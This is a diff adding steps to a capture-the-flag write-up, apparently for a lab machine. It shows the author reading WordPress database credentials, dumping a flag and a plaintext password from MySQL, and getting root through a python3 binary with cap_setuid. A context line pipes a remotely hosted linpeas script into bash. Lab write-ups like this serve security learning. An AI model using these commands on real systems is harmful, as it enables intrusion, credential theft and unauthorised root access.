@@ -310,6 +310,72 @@ user1@ip-10-1-39-71:~$ curl http://10.200.18.143:8000/lin/linpeas.sh | bash
 /snap/snapd/25202/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
 ```
 
+```bash
+user1@ip-10-1-39-71:~$ cat /var/www/html/wp-config.php
+```
+
+![Wordpress config](/assets/img/ctf/hs/easy/ascension/4.pmg)
+
+*wpuser:wppassword* at *localhost*
+
+```bash
+mysql -h 127.0.0.1 -u wpuser -p
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+
+mysql> show databases;
++--------------------+                                                                                      
+| Database           |                                                                                      
++--------------------+
+| information_schema |                                
+| performance_schema |                                                                                      
+| wordpress          |                                
++--------------------+
+
+mysql> use wordpress;                                 
+Reading table information for completion of table and column names                                          
+You can turn off this feature to get a quicker startup with -A                                              
+                                                      
+Database changed                                      
+mysql> show tables;                                   
++---------------------+                               
+| Tables_in_wordpress |                               
++---------------------+                               
+| flags               |                               
+| users               |                               
++---------------------+                               
+2 rows in set (0.00 sec)                              
+
+mysql> select * from flags;                           
++----+------------------------------------------+
+| id | flag                                     |
++----+------------------------------------------+
+|  1 | RkxBRzR7d2ViamhuYXNkMzg5MjM0a25kam9pM2R9 |
++----+------------------------------------------+
+1 row in set (0.00 sec)           
+
+mysql> select * from users;
++----+----------+---------------+
+| id | username | password      |
++----+----------+---------------+
+|  1 | user3    | user3password |
++----+----------+---------------+
+```
+
 ## Root / SYSTEM
+
+```bash
+user3@ip-10-1-39-71:~$ getcap -r / 2>/dev/null   
+
+/home/user3/python3 cap_setuid=ep
+```
+
+[cap_setuid](https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/linux-capabilities#cap_setuid)
+
+```bash
+user3@ip-10-1-39-71:~$ ~/python3 -c "import os;os.setuid(0);os.system('/bin/bash')" 
+root@ip-10-1-39-71:~#
+```
+
 # Lessons Learned
 
